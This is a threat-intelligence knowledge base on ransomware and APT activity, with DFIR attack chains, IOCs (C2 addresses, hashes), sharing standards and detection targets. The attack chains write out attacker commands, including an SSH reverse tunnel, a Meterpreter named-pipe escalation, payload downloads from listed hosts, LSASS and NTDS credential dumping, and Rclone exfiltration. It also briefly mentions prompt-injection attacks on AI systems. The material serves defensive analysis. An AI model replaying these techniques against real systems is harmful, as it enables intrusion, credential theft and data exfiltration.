# Threat Intelligence Deep Training
## CIPHER Knowledge Base — Current Threat Landscape, Ransomware TTPs, Attack Chains, IOC Sharing & CTI Methodology
### Last Updated: 2026-03-14

---

## 1. Current Threat Landscape Overview

### 1.1 Scale of the Problem (2026)
- **CISA KEV Catalog**: 1,542 known exploited vulnerabilities actively tracked
- **Ransomware Groups Monitored**: 549 active groups tracked by RansomLook
- **Ransomware Posts (90 days)**: ~2,930 victim posts; ~29,593 total historical
- **Dark Leak Sites**: 731 active DLS endpoints across ransomware ecosystem
- **MITRE ATT&CK Groups**: 176 tracked threat actor groups globally
- **Active Ransomware Infrastructure**: 701 operational relays, 305 chat channels, 141 dark markets

### 1.2 Recent Critical Vulnerabilities (CISA KEV — March 2026)

| CVE | Product | Type | Severity |
|-----|---------|------|----------|
| CVE-2026-3909 | Google Skia (Chrome/Android) | Out-of-bounds write | Critical |
| CVE-2026-3910 | Chromium V8 | Memory buffer boundary violation / sandbox escape | Critical |
| CVE-2026-20127 | Cisco SD-WAN | Authentication bypass (unauthenticated admin access) | Critical |
| CVE-2026-22769 | Dell RecoverPoint | Hard-coded credentials (root persistence) | Critical |
| CVE-2023-46604 | Apache ActiveMQ | RCE via ClassPathXmlApplicationContext | Critical |

### 1.3 CISA Shields Up — Standing Defensive Posture
Key directives for all organizations:
- Adopt heightened cybersecurity posture for critical assets
- Deploy MFA universally; enforce strong password policies
- Monitor for exploitation of KEV-listed vulnerabilities
- Establish and test incident response procedures
- Executive/CEO-level accountability for security posture
- Do NOT pay ransom — it does not guarantee decryption and funds criminal operations
- Report anomalous activity to CISA (report@cisa.gov / 1-844-Say-CISA)

---

## 2. Threat Actor Profiles

### 2.1 Nation-State APT Groups (Major)

#### Russia
| Group | Aliases | Affiliation | Primary Targets |
|-------|---------|-------------|-----------------|
| APT28 (G0007) | Fancy Bear, Sofacy, Forest Blizzard | GRU (Unit 26165) | Government, military, media, elections |
| APT29 (G0016) | Cozy Bear, NOBELIUM, Midnight Blizzard | SVR | Government, diplomatic, think tanks |
| Sandworm (G0034) | ELECTRUM, Voodoo Bear, APT44 | GRU (Unit 74455) | Critical infrastructure, destructive attacks (NotPetya, Industroyer) |
| Gamaredon (G0047) | Primitive Bear, Armageddon | FSB | Ukraine government and military |
| Ember Bear (G1003) | Saint Bear, UAC-0056 | GRU | Government, Ukraine-focused |

#### China
| Group | Aliases | Affiliation | Primary Targets |
|-------|---------|-------------|-----------------|
| APT1 (G0006) | Comment Crew | PLA Unit 61398 | Multiple sectors, IP theft |
| APT41 (G0096) | Wicked Panda, Brass Typhoon | MSS + Cybercrime dual-hat | Technology, healthcare, gaming |
| Volt Typhoon (G1017) | BRONZE SILHOUETTE | PRC state | US critical infrastructure, living-off-the-land |
| Salt Typhoon (G1045) | PRC state-backed | PRC state | Telecom/ISP infrastructure |
| APT40/Leviathan (G0065) | MUDCARP, Gingham Typhoon | MSS (Hainan) | Aerospace, maritime, defense |
| Mustang Panda (G0129) | RedDelta, BRONZE PRESIDENT | PRC state | Government, NGOs, Southeast Asia |
| UAT-9244 | Associated with Famous Sparrow | China-nexus | South American telecommunications |

#### Iran
| Group | Aliases | Affiliation | Primary Targets |
|-------|---------|-------------|-----------------|
| APT33 (G0064) | Elfin, Peach Sandstorm | IRGC | Energy, aerospace, aviation |
| APT34/OilRig (G0049) | EUROPIUM, Hazel Sandstorm | MOIS | Energy, financial, government |
| MuddyWater (G0069) | MERCURY, Static Kitten | MOIS | Government entities (Operation Olalampo — 2026) |
| APT39 (G0087) | Chafer, Remix Kitten | MOIS | Travel, telecommunications |
| Handala Hack | Void Manticore | Iran-linked | Wiper attacks, IP camera exploitation, Middle East targets |

#### North Korea
| Group | Aliases | Affiliation | Primary Targets |
|-------|---------|-------------|-----------------|
| Lazarus Group (G0032) | HIDDEN COBRA, Diamond Sleet | RGB | Financial theft, destructive attacks |
| APT38 (G0082) | BeagleBoyz, Sapphire Sleet | RGB | SWIFT/banking systems, cryptocurrency |
| Kimsuky (G0094) | Black Banshee, Emerald Sleet | RGB | Espionage, academics, policy |
| APT37 (G0067) | ScarCruft, Reaper, Ricochet Chollima | RGB | South Korea, dissidents |
| Moonstone Sleet (G1036) | Storm-1789 | RGB | Financial and espionage dual-purpose |

#### Other
| Group | Country | Focus |
|-------|---------|-------|
| APT32/OceanLotus (G0050) | Vietnam | Regional espionage, dissidents |
| Silver Dragon | Unknown | Southeast Asia and Europe multi-region campaigns |
| CL-STA-1087 | China-suspected | Southeast Asian military espionage (2026) |
| CL-UNK-1068 | Unknown | Prolonged undetected operations, DLL sideloading, high-value sectors |

### 2.2 Cybercrime & Ransomware Groups

#### Major Ransomware Operations (Active 2025-2026)
| Group | Ransomware | RaaS Model | Notable TTPs |
|-------|------------|------------|--------------|
| LockBit | LockBit 3.0 (leaked builder) | Yes (RaaS) | Leaked builder enables independent operators; SMB spreader (-psex); Session messenger for negotiation |
| Akira | Akira | Yes (RaaS) | Malvertising via search engines; Bumblebee loader; AdaptixC2; targets local + network + remote dirs |
| Lynx | Lynx/Playcrypt variant | Emerging | RDP initial access; fast encryption mode (5%); SoftPerfect NetScan; temp.sh exfil |
| Play (G1040) | Playcrypt | Yes | Interconnected with DragonForce and RansomHub operations |
| DragonForce | DragonForce | Yes | Cross-group collaboration with Play and RansomHub |
| RansomHub | RansomHub | Yes (RaaS) | Interconnected ecosystem with multiple affiliates |
| BlackByte (G1043) | BlackByte 1.0/2.0 | Yes | Living-off-the-land, driver exploitation |
| Medusa (G1051) | Medusa | Yes (RaaS) | Double extortion, DLS |

#### Financial Cybercrime Groups
| Group | Focus | Notable Activity |
|-------|-------|-----------------|
| FIN7 (G0046) / Carbon Spider | Retail/hospitality POS | Evolved to ransomware operations |
| Indrik Spider (G0119) / Evil Corp | Banking trojans | Dridex -> BitPaymer -> WastedLocker -> sanctions evasion |
| Lunar Spider | Initial access brokerage | Latrodectus loader, sells access to ransomware affiliates |
| TA505 (G0092) | Mass phishing | Clop ransomware, MOVEit exploitation |
| LAPSUS$ (G1004) | Extortion | Social engineering, SIM swapping, no encryption |
| Scattered Spider | Identity attacks | Help desk social engineering, Okta targeting |

### 2.3 Vendor Naming Cross-Reference

| Microsoft | CrowdStrike | Mandiant/Google | MITRE |
|-----------|-------------|-----------------|-------|
| Forest Blizzard | Fancy Bear | APT28 | G0007 |
| Midnight Blizzard | Cozy Bear | APT29 | G0016 |
| Brass Typhoon | Wicked Panda | APT41 | G0096 |
| Peach Sandstorm | Elfin | APT33 | G0064 |
| Diamond Sleet | Lazarus | Lazarus Group | G0032 |
| Sangria Tempest | Carbon Spider | FIN7 | G0046 |
| Manatee Tempest | Indrik Spider | Evil Corp | G0119 |

---

## 3. Real-World Attack Chains from DFIR Reports

### 3.1 Apache ActiveMQ -> LockBit Ransomware (Feb 2026)

**Timeline**: 419 hours (~19 days) from initial access to ransomware deployment

```
INITIAL ACCESS (Day 1)
  CVE-2023-46604 exploitation on internet-facing ActiveMQ
  → ClassPathXmlApplicationContext loads malicious XML
  → CertUtil downloads payloads
    ↓
EXECUTION & C2
  Metasploit stager (uFSyLszKsuR.exe) → process injection → shellcode
  C2: 166.62.100[.]52:2460
    ↓
PERSISTENCE
  AnyDesk installed as AutoStart service
  Same C2 IP used for AnyDesk login (Client ID: 1312001388)
    ↓
PRIVILEGE ESCALATION
  Meterpreter getsystem (named pipe impersonation)
  Service "kesknq": cmd.exe /c echo kesknq > \\.\pipe\kesknq
    ↓
CREDENTIAL ACCESS
  LSASS memory dump (GrantedAccess 0x1010)
  Domain admin + service account credentials extracted
    ↓
DISCOVERY
  Advanced IP Scanner (renamed), netscan.exe
  Port scan: 445, 3389, 22 prioritized
    ↓
LATERAL MOVEMENT
  Round 1: Remote service execution via Metasploit (partially blocked by AV)
  Round 2: RDP with stolen service account credentials
    ↓
DEFENSE EVASION
  Event log clearing (IDs 104, 1102)
  SystemSettingsAdminFlows.exe → Defender disabling (LOLBIN)
  Obfuscated PowerShell (Base64/Gzip)
  RDP config via batch file
    ↓
IMPACT (Day 18)
  LockBit 3.0 (leaked builder variant)
  Flags: -psex (SMB spreader) + custom path/password
  Ransom notes → Session messenger (not standard Tor/Jabber)
  Indicates independent operator using leaked builder
```

**Key IOCs**: C2 166.62.100[.]52 | LB3_pass.exe SHA256: C8646CFB574FF2C6F183C3C3951BF6B2C6CF16FF8A5E949A118BE27F15962FAE

**Detection Opportunities**: CertUtil downloading executables, named pipe creation matching Meterpreter patterns, AnyDesk service installation, Advanced IP Scanner renamed binaries, LSASS access with 0x1010, event log clearing.

---

### 3.2 Bing Search Malvertising -> Bumblebee -> AdaptixC2 -> Akira (Nov 2025)

**Timeline**: 44 hours from initial access to ransomware

```
INITIAL ACCESS
  SEO poisoning: "ManageEngine OpManager" search on Bing
  → Redirect to opmanager[.]pro
  → Trojanized MSI installer (ManageEngine-OpManager.msi)
    ↓
LOADER EXECUTION
  MSI loads Bumblebee (msimg32.dll) via consent.exe DLL sideloading
  Bumblebee C2: 109.205.195[.]211:443, 188.40.187[.]145:443
  DGA domains: ev2sirbd269o5j.org, 2rxyt9urhq0bgj.org
    ↓
SECOND-STAGE C2 (~5 hours)
  AdaptixC2 beacon (AdgNsy.exe)
  C2: 172.96.137[.]160:443
    ↓
DISCOVERY
  systeminfo, nltest /dclist:, whoami /groups
  net group "domain admins" /dom
    ↓
PERSISTENCE & PRIVESC
  Created accounts: backup_DA, backup_EA
  backup_EA → Enterprise Administrators group
  Domain controller access via RDP
    ↓
LATERAL MOVEMENT
  RustDesk remote access deployed across hosts
  SSH reverse tunnel: ssh root@<IP> -R *:10400 -p22
    ↓
CREDENTIAL HARVESTING
  NTDS.dit dump via wbadmin backup
  Veeam PostgreSQL credential extraction (psql.exe)
  LSASS dump via rundll32.exe comsvcs.dll
    ↓
EXFILTRATION
  FileZilla → SFTP to 185.174.100[.]203
    ↓
RANSOMWARE (44 hours)
  Akira locker.exe targeting local drives + network shares + remote dirs
```

**Key IOCs**: Bumblebee SHA256: a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331 | Akira SHA256: de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d

**Detection Opportunities**: MSI sideloading consent.exe, DGA domain resolution, wbadmin NTDS backup, comsvcs.dll MiniDump, Enterprise Admin group additions, SSH reverse tunnels, RustDesk installation.

---

### 3.3 Lynx Ransomware via RDP (Dec 2025)

**Timeline**: ~178 hours (9 days)

```
INITIAL ACCESS
  RDP with pre-obtained valid credentials (likely infostealer/IAB)
  Source: 195.211.190[.]189 (Railnet LLC/Virtualine — bulletproof hosting)
  No brute force — clean credential use
    ↓
DISCOVERY
  SoftPerfect NetScan v7.2.7 (paid license)
  NetExec (nxc.exe) for SMB enumeration
  Share write tests (delete.me files)
  Results exported to ss.xml
    ↓
PERSISTENCE
  Three domain accounts created: "administratr", "Lookalike 1", "Lookalike 2"
  → Added to Domain Admins + Group Policy Creator Owners
  → Non-expiring passwords
  AnyDesk installed (unused)
    ↓
LATERAL MOVEMENT
  RDP: Beachhead → DC → Hypervisors → Backup servers → File servers
  Using compromised + newly created domain admin accounts
  Hostname: DESKTOP-BUL6K1U
  Second IP: 77.90.153[.]30 (also bulletproof hosting)
    ↓
COLLECTION & EXFILTRATION
  7-Zip compression of network shares
  Upload to temp.sh (temporary file-sharing service)
    ↓
IMPACT (Day 9)
  Lynx ransomware (w.exe)
  --mode fast (5% file encryption)
  --noprint (no printer ransom notes)
  Veeam backup jobs deleted before encryption
```

**Key IOCs**: Lynx SHA256: 07b36c1660deb223749a8ac151676d8924bc13aa59e6712a3c14a2df5237264a | C2 IPs: 195.211.190[.]189, 77.90.153[.]30

**Detection Opportunities**: Account creation with typo names (evasion attempt), Domain Admin additions, NetExec/nxc.exe execution, 7-Zip archiving of share data, temp.sh uploads, Veeam backup deletion.

---

### 3.4 Lunar Spider — Latrodectus + BruteRatel + Cobalt Strike (Sep 2025)

**Timeline**: ~56 days (near two-month dwell time, NO ransomware deployed)

```
INITIAL ACCESS
  Malicious JavaScript masquerading as tax form (W-9)
  Heavily obfuscated with filler content
    ↓
EXECUTION CHAIN
  JS → HTTP request for MSI installer (91.194.11[.]64/MSI.msi)
  → MSI extracts upfilles.dll in disk1.cab
  → rundll32.exe invokes export "stow"
  → Custom API hashing → XOR → RC4 decryption
  → Brute Ratel Badger deployed
    ↓
PROCESS INJECTION
  BruteRatel → injects Latrodectus into explorer.exe via CreateRemoteThread
    ↓
C2 INFRASTRUCTURE (Multi-layer)
  Latrodectus C2 (CloudFlare-proxied): workspacin.cloud, illoskanawer.com, etc.
  BackConnect: 193.168.143.196, 185.93.221.12
  BruteRatel C2: anikvan.com, altynbe.com (PQ Hosting, Akamai, AWS Tyk.io)
  Cobalt Strike: avtechupdate.com:443, 45.129.199.214:80/8080
    ↓
CREDENTIAL ACCESS
  Latrodectus stealer module → 29+ Chromium browsers, Firefox, Outlook
  unattend.xml with plaintext domain admin credentials (left from deployment)
  LSASS access (0x1010 → 0x1fffff)
  Veeam credential dump (Veeam-Get-Creds.ps1)
    ↓
PERSISTENCE
  Registry Run Key (Update → upfilles.dll → wscadminui.dll)
  Scheduled Task "SchedulerLsass" → lsassa.exe on startup
    ↓
LATERAL MOVEMENT
  PsExec → Cobalt Strike system.dl_ to DC, file share, backup server
  Zerologon exploit (CVE-2020-1472) via zero.exe against second DC
  RDP with stolen domain admin creds (hostname leak: VPS2DAY-32220LE)
    ↓
DISCOVERY
  AdFind (users, computers, OUs, subnets, trusts)
  dsquery, nltest, Invoke-ShareFinder
  rustscan scanning /16 and /8 CIDR blocks on port 445
    ↓
DEFENSE EVASION
  Process injection into: explorer.exe, sihost.exe, spoolsv.exe, gpupdate.exe
  UAC bypass via ms-settings protocol hijacking + token duplication
  File deletion of >50% of tools post-use
    ↓
EXFILTRATION
  Rclone (renamed to sihosts.exe) via VBScript launcher
  FTP destination: 45.135.232.3
  Exfil duration: 9 hours 46 minutes
  Config excluded: .dll, .exe, .log, .cab, etc.
    ↓
NO RANSOMWARE DEPLOYED (despite full domain compromise)
```

**Key Insight**: Lunar Spider operates as an **initial access broker (IAB)** — they compromise, persist, exfiltrate, then hand off (or sell) access to ransomware operators. The absence of ransomware in a 56-day intrusion with full domain admin access is the signature of IAB activity.

**Detection Opportunities**: JS executing MSI downloads, rundll32 loading DLLs from user temp, BruteRatel API hashing patterns, AdFind enumeration, Zerologon exploitation (Netlogon anomalies), Rclone renamed binary, scheduled task with LSASS-like names.

---

### 3.5 DragonForce/Play/RansomHub Interconnection (Sep 2025)

Three major ransomware gangs showed **operational overlap**: shared infrastructure, tooling (SectoPrat), and possible affiliate cross-pollination. This blurs attribution and suggests a consolidating ransomware ecosystem where affiliates move between RaaS platforms or multiple platforms share backend infrastructure.

---

## 4. Common Ransomware TTPs — Consolidated Pattern

### 4.1 The Modern Ransomware Kill Chain

```
┌─────────────────┐
│  INITIAL ACCESS  │ ← RDP (valid creds/IAB), Phishing, Malvertising,
│                  │   Exploit public-facing apps (VPN, ActiveMQ, Exchange)
└────────┬────────┘
         ↓
┌─────────────────┐
│   EXECUTION     │ ← Loaders (Bumblebee, Latrodectus, IcedID, QBot)
│                 │   MSI sideloading, PowerShell, rundll32, mshta
└────────┬────────┘
         ↓
┌─────────────────┐
│   PERSISTENCE   │ ← Registry Run keys, Scheduled Tasks, RMM tools
│                 │   (AnyDesk, RustDesk, ScreenConnect), Domain accounts
└────────┬────────┘
         ↓
┌─────────────────┐
│   PRIVILEGE     │ ← Meterpreter getsystem, Zerologon (CVE-2020-1472),
│   ESCALATION    │   UAC bypass, Domain Admin credential theft
└────────┬────────┘
         ↓
┌─────────────────┐
│   DEFENSE       │ ← Disable Defender (LOLBINs), clear event logs,
│   EVASION       │   process injection, tool renaming, file deletion
└────────┬────────┘
         ↓
┌─────────────────┐
│   CREDENTIAL    │ ← LSASS dump (comsvcs.dll, procdump, Mimikatz),
│   ACCESS        │   NTDS.dit via wbadmin, Veeam cred extraction,
│                 │   unattend.xml, browser credential stores
└────────┬────────┘
         ↓
┌─────────────────┐
│   DISCOVERY     │ ← AdFind, NetScan, NetExec, Advanced IP Scanner,
│                 │   nltest, net group, Invoke-ShareFinder, rustscan
└────────┬────────┘
         ↓
┌─────────────────┐
│   LATERAL       │ ← RDP, PsExec, SMB, remote service creation,
│   MOVEMENT      │   WMI, SSH tunneling
└────────┬────────┘
         ↓
┌─────────────────┐
│   COLLECTION &  │ ← Rclone, FileZilla (SFTP), 7-Zip, temp.sh,
│   EXFILTRATION  │   Mega.io — always BEFORE encryption
└────────┬────────┘
         ↓
┌─────────────────┐
│   IMPACT        │ ← Ransomware deployment (LockBit, Akira, Lynx, etc.)
│                 │   Backup deletion (Veeam, shadow copies)
│                 │   Double/triple extortion (encrypt + leak + DDoS)
└─────────────────┘
```

### 4.2 Time-to-Ransomware (TTR) Trends

| Case | TTR | Notes |
|------|-----|-------|
| Bumblebee → Akira | 44 hours | Fastest — automated pipeline |
| Lynx via RDP | 178 hours (9 days) | Manual operator, methodical |
| ActiveMQ → LockBit | 419 hours (19 days) | Re-exploitation after initial pause |
| Lunar Spider (no ransom) | 56 days | IAB model — access sold, not encrypted |

**Trend**: TTR is shrinking for automated affiliate operations but remains longer for manual, hands-on-keyboard intrusions. IAB operations can have very long dwell times.

### 4.3 Top Attacker Tools Observed

| Tool | Purpose | Frequency |
|------|---------|-----------|
| Cobalt Strike | C2 framework | Very High |
| Brute Ratel (BRC4) | C2 framework (EDR evasion) | High |
| AdaptixC2 | C2 framework (emerging) | Increasing |
| Metasploit/Meterpreter | Exploitation + C2 | High |
| AnyDesk | Persistence/remote access | Very High |
| RustDesk | Persistence/remote access (emerging) | Increasing |
| Advanced IP Scanner | Network discovery | Very High |
| SoftPerfect NetScan | Network discovery | High |
| NetExec (nxc) | SMB/AD enumeration | High |
| AdFind | AD enumeration | High |
| Rclone | Data exfiltration | Very High |
| FileZilla | Data exfiltration (SFTP) | High |
| 7-Zip | Data compression | High |
| Bumblebee | Loader | High |
| Latrodectus | Loader (Lunar Spider) | Increasing |

---

## 5. Current Threat Intelligence by Sector (2026)

### 5.1 Iran-Focused Activity Surge (March 2026)
Multiple vendors report heightened Iranian operations:
- **Handala Hack / Void Manticore**: Wiper attacks increasing; IP camera exploitation for kinetic warfare support (Unit 42, Check Point)
- **MuddyWater (Operation Olalampo)**: New malware variants using Telegram bots for C2 (Group-IB)
- **MOIS actors**: Connections between state-sponsored operations and cybercriminal activities (Check Point)
- **Proofpoint**: Heightened espionage against Middle East targets driven by Iran conflict
- **Wiper trend**: Iran-linked groups shifting from espionage to destructive operations

### 5.2 China-Nexus Espionage (March 2026)
- **UAT-9244**: Targeting South American telecom with three new malware implants (Talos)
- **CL-STA-1087**: Southeast Asian military targeting (Unit 42)
- **CL-UNK-1068**: Years of undetected operations using DLL sideloading and Fast Reverse Proxy (Unit 42)
- **Volt Typhoon**: Continued pre-positioning in US critical infrastructure
- **Salt Typhoon**: Ongoing telecom/ISP compromise

### 5.3 Supply Chain & AI-Targeting Threats
- **Six supply chain attack groups to watch in 2026** — npm ecosystem attacks, SaaS/MSP targeting (Group-IB)
- **AI agent exploitation**: Prompt injection attacks against AI security systems observed in the wild (Unit 42)
- **Agentic AI risks**: Autonomous agent deployment creates new exploitation surfaces (Talos)
- **GTFire phishing**: Abusing Google Firebase + Google Translate to scale phishing at global scale (Group-IB)
- **Claude Code RCE**: CVE-2025-59536, CVE-2026-21852 — RCE and API token exfiltration via project files (Check Point)

### 5.4 Fake Shipment Scams & Financial Fraud
- **MEA region**: Telegram-based malicious app distribution disguised as shipment tracking (Group-IB)
- **Indonesia tax fraud**: Industrialized MaaS infrastructure impersonating Coretax tax authority (Group-IB)

---

## 6. IOC Types and Sharing Formats

### 6.1 Indicator Types (Pyramid of Pain)

David Bianco's Pyramid of Pain ranks indicators by the cost to the adversary when denied:

```
        /\
       /  \  TTPs (Tactics, Techniques, Procedures)
      /    \  — Hardest to change; highest detection value
     /──────\
    /  Tools  \  — C2 frameworks, custom malware
   /──────────\
  / Network /   \  — C2 domains, IPs, certificates
 /  Host    /    \  — Registry keys, mutex names, file paths
/  Artifacts/     \
/──────────────────\
/ Hash Values       \  — File hashes (MD5, SHA1, SHA256)
/────────────────────\  — Trivial to change; lowest value
```

| Level | IOC Type | Examples | Adversary Cost to Change |
|-------|----------|----------|--------------------------|
| Hash Values | MD5, SHA1, SHA256 | Malware sample hashes | Trivial (recompile) |
| IP Addresses | IPv4, IPv6 | C2 servers, exfil destinations | Low (new VPS) |
| Domain Names | FQDN | C2 domains, DGA seeds | Low-Medium |
| Network Artifacts | URI patterns, JA3/JA4, User-Agents | /api/beacon, custom TLS fingerprints | Medium |
| Host Artifacts | Registry keys, file paths, mutex names | Run key entries, named pipes | Medium |
| Tools | Software, frameworks | Cobalt Strike, BruteRatel, Rclone | Medium-High |
| TTPs | Behavioral patterns | LSASS dump via comsvcs.dll, Zerologon | Very High |

### 6.2 IOC Sharing Standards

#### STIX (Structured Threat Information eXpression)
- **Version**: STIX 2.1 (current standard)
- **Format**: JSON-based
- **Purpose**: Represent full range of cyber threat information — indicators, threat actors, campaigns, attack patterns, malware, vulnerabilities, courses of action
- **Key Objects**: Indicator, Malware, Threat-Actor, Attack-Pattern, Campaign, Intrusion-Set, Observed-Data, Relationship, Sighting
- **Embedding**: Can include OpenIOC, YARA, Snort rules as test mechanisms
- **OASIS Standard**: Maintained by OASIS Open

#### TAXII (Trusted Automated eXchange of Indicator Information)
- **Version**: TAXII 2.1
- **Purpose**: Transport protocol for STIX data exchange
- **Services**: Discovery, Collection Management, Inbox (push), Poll (pull)
- **Protocol**: RESTful HTTPS API
- **Use Case**: Automated machine-to-machine threat intelligence sharing between organizations

#### Other Formats
| Format | Purpose |
|--------|---------|
| **CybOX** | Cyber Observable eXpression — common structure for cyber observables (now merged into STIX 2.x) |
| **IODEF (RFC 5070)** | Incident Object Description Exchange Format — CSIRT incident data sharing |
| **IDMEF (RFC 4765)** | Intrusion Detection Message Exchange Format — IDS/IPS data exchange |
| **MAEC** | Malware Attribute Enumeration and Characterization — standardized malware description |
| **OpenC2** | Open Command and Control — standardized cyber defense command language |
| **VERIS** | Vocabulary for Event Recording and Incident Sharing — breach classification (powers Verizon DBIR) |
| **CAPEC** | Common Attack Pattern Enumeration and Classification — attack pattern taxonomy |
| **MISP Format** | Native MISP JSON event format — widely used in MISP ecosystem |
| **CSV/JSON** | CISA KEV catalog available in CSV, JSON, JSON Schema for tool integration |

### 6.3 Sharing Platforms and Feeds

#### Government / ISACs
- **CISA AIS**: Automated Indicator Sharing — machine-speed STIX/TAXII exchange between federal and private sector
- **CISA KEV**: Known Exploited Vulnerabilities catalog (CSV/JSON)
- **ISACs**: Sector-specific sharing (FS-ISAC, H-ISAC, etc.)

#### Community Platforms
- **MISP**: Open-source threat intelligence platform (most widely deployed TIP)
- **OpenCTI**: Open-source cyber threat intelligence platform
- **TheHive/Cortex**: Incident response + observable analysis platform
- **IntelOwl**: OSINT aggregation (VirusTotal, AbuseIPDB, YARA analysis)
- **CRITs**: Collaborative malware research platform

#### Commercial TIPs
- **EclecticIQ Platform**: STIX/TAXII-based TIP
- **Recorded Future**: Intelligence analytics platform
- **ThreatConnect**: TIP with automated IOC ingestion from 90+ blogs
- **Cyware CTIX**: Client-server TIP with bi-directional sharing

#### Free Threat Feeds (Key Sources)
| Source | Type | Format |
|--------|------|--------|
| abuse.ch (ThreatFox, URLhaus, MalwareBazaar, SSLBL, Feodo Tracker) | IOCs, malware samples, URLs, SSL certs | STIX, CSV, API |
| AbuseIPDB | Malicious IP crowdsource | API |
| AlienVault OTX | Multi-type IOCs | STIX, API |
| CrowdSec | Crowdsourced IPs from real attacks | API, blocklists |
| GreyNoise | Internet scanner classification | API |
| IPsum | Aggregated IP blacklists (30+ sources) | Text |
| FireHOL IP Lists | 400+ IP feeds analyzed | Various |
| YARA-Rules | Community YARA signatures | YARA |
| Emerging Threats | Snort/Suricata rules, firewall rules | IDS rules |
| SANS ISC | Suspicious domains (high/medium/low) | Text |

---

## 7. CTI Analysis Methodology

### 7.1 The Intelligence Cycle

```
    ┌─────────────┐
    │  DIRECTION   │ ← Requirements, Priority Intelligence Requirements (PIRs)
    │  & PLANNING  │   What does the organization need to know?
    └──────┬──────┘
           ↓
    ┌─────────────┐
    │  COLLECTION  │ ← OSINT, HUMINT, SIGINT, technical feeds, dark web
    │              │   Passive vs. active collection disciplines
    └──────┬──────┘
           ↓
    ┌─────────────┐
    │  PROCESSING  │ ← Normalize, deduplicate, enrich, correlate
    │              │   IOC enrichment, STIX conversion, feed aggregation
    └──────┬──────┘
           ↓
    ┌─────────────┐
    │  ANALYSIS    │ ← Apply analytic frameworks (see below)
    │              │   Structured analytic techniques, hypothesis testing
    └──────┬──────┘
           ↓
    ┌─────────────┐
    │ DISSEMINATION│ ← Deliver to stakeholders in appropriate format
    │              │   Strategic (exec), operational (SOC), tactical (SIEM rules)
    └──────┬──────┘
           ↓
    ┌─────────────┐
    │  FEEDBACK    │ ← Was the intelligence useful? Adjust PIRs
    │              │   Continuous improvement loop
    └─────────────┘
```

### 7.2 Core Analytic Frameworks

#### Diamond Model of Intrusion Analysis
Four core features connected in a diamond shape:
- **Adversary**: Threat actor identity, motivation, capability
- **Infrastructure**: C2 servers, domains, hosting, bulletproof providers
- **Capability**: Malware, tools, exploits, techniques
- **Victim**: Targeted organization, sector, system, persona

Pivoting between vertices enables attribution and campaign correlation. Example: a C2 IP (infrastructure) shared between two campaigns links different adversary operations.

#### Cyber Kill Chain (Lockheed Martin)
Seven sequential phases an adversary must complete:
1. **Reconnaissance** — Target research, vulnerability scanning
2. **Weaponization** — Coupling exploit with backdoor into deliverable payload
3. **Delivery** — Transmitting weaponized payload (email, web, USB)
4. **Exploitation** — Triggering the vulnerability
5. **Installation** — Installing backdoor/implant on victim
6. **Command & Control** — Establishing outbound C2 channel
7. **Actions on Objectives** — Exfiltration, destruction, ransomware

Defensive value: disrupting any phase breaks the chain.

#### MITRE ATT&CK Framework
- **14 Tactics** (the "why"): Reconnaissance through Impact
- **Hundreds of Techniques/Sub-techniques** (the "how")
- **Groups, Software, Campaigns** mapped to techniques
- **Data Sources + Detections** mapped to techniques
- Use ATT&CK Navigator for coverage gap analysis and heat mapping

#### Unified Kill Chain
Combines Lockheed Martin Kill Chain + MITRE ATT&CK into three phases:
1. **Initial Foothold** (external to internal)
2. **Network Propagation** (lateral movement and escalation)
3. **Action on Objectives** (mission completion)

#### OODA Loop (Boyd Cycle)
- **Observe** — Collect data from sensors, feeds, alerts
- **Orient** — Context, experience, analytic frameworks
- **Decide** — Choose response/action
- **Act** — Execute defensive measures
- Cycle faster than the adversary to maintain advantage

#### Pyramid of Pain (Bianco)
Ranks indicator types by adversary cost — prioritize detection at TTP level for maximum defensive value (see section 6.1).

### 7.3 Structured Analytic Techniques

From the CIA Tradecraft Primer and intelligence community methodology:

| Technique | Purpose |
|-----------|---------|
| **Analysis of Competing Hypotheses (ACH)** | Systematically evaluate multiple hypotheses against evidence |
| **Key Assumptions Check** | Identify and challenge underlying assumptions |
| **Devil's Advocacy** | Deliberately argue against prevailing assessment |
| **Red Team Analysis** | Think like the adversary to anticipate actions |
| **Timeline Analysis** | Chronological ordering of events for pattern identification |
| **Link/Network Analysis** | Map relationships between actors, infrastructure, campaigns |
| **Indicator Lifecycle Management** | Track indicator validity, aging, and retirement |
| **Confidence Assessment** | Assign confidence levels to analytical judgments |

### 7.4 Intelligence Requirements Framework

#### Strategic Intelligence
- **Audience**: Executive leadership, board
- **Content**: Threat landscape trends, sector risk, geopolitical context
- **Format**: Briefings, quarterly reports
- **Example**: "Which nation-state groups are targeting our sector?"

#### Operational Intelligence
- **Audience**: SOC managers, IR teams, security operations
- **Content**: Active campaigns, threat actor TTPs, emerging tooling
- **Format**: Threat advisories, campaign reports
- **Example**: "What does the Akira ransomware deployment chain look like?"

#### Tactical Intelligence
- **Audience**: SOC analysts, SIEM engineers, detection teams
- **Content**: IOCs, detection rules, YARA signatures
- **Format**: STIX bundles, Sigma rules, blocklists
- **Example**: "Block these C2 IPs and deploy these Sigma rules"

### 7.5 CTI Maturity Model (CREST)

| Level | Description |
|-------|-------------|
| **Level 0** | No CTI capability — purely reactive |
| **Level 1** | Ad-hoc — consume free feeds, basic IOC matching |
| **Level 2** | Defined — established process, TIP deployed, some analysis |
| **Level 3** | Managed — PIRs defined, structured analysis, proactive hunting |
| **Level 4** | Optimized — Full intelligence cycle, production, feedback loop, contributes to community |

### 7.6 Analyst Core Competencies (Mandiant Framework)
- Malware analysis and reverse engineering
- Network traffic analysis and protocol understanding
- Adversary infrastructure tracking and pivoting
- Report writing and intelligence production
- STIX/TAXII and sharing platform proficiency
- Programming/scripting for automation
- Structured analytic technique application
- Geopolitical awareness and contextual analysis

---

## 8. Detection Quick Reference — High-Value Sigma Rule Targets

Based on the DFIR report attack chains, these are the highest-value detection targets:

| Detection | MITRE | Why |
|-----------|-------|-----|
| LSASS access (comsvcs.dll, procdump, 0x1010 GrantedAccess) | T1003.001 | Present in nearly every intrusion |
| NTDS.dit backup via wbadmin | T1003.003 | Domain credential theft |
| Named pipe creation matching Meterpreter getsystem | T1134 | Privilege escalation signature |
| CertUtil downloading executables | T1105 | Common payload download method |
| AnyDesk/RustDesk/ScreenConnect service installation | T1219 | RMM abuse for persistence |
| Advanced IP Scanner / NetScan / NetExec execution | T1046 | Network discovery tooling |
| AdFind enumeration commands | T1087.002 | AD reconnaissance |
| Event log clearing (IDs 104, 1102) | T1070.001 | Defense evasion |
| Rclone execution (especially renamed) | T1567 | Data exfiltration |
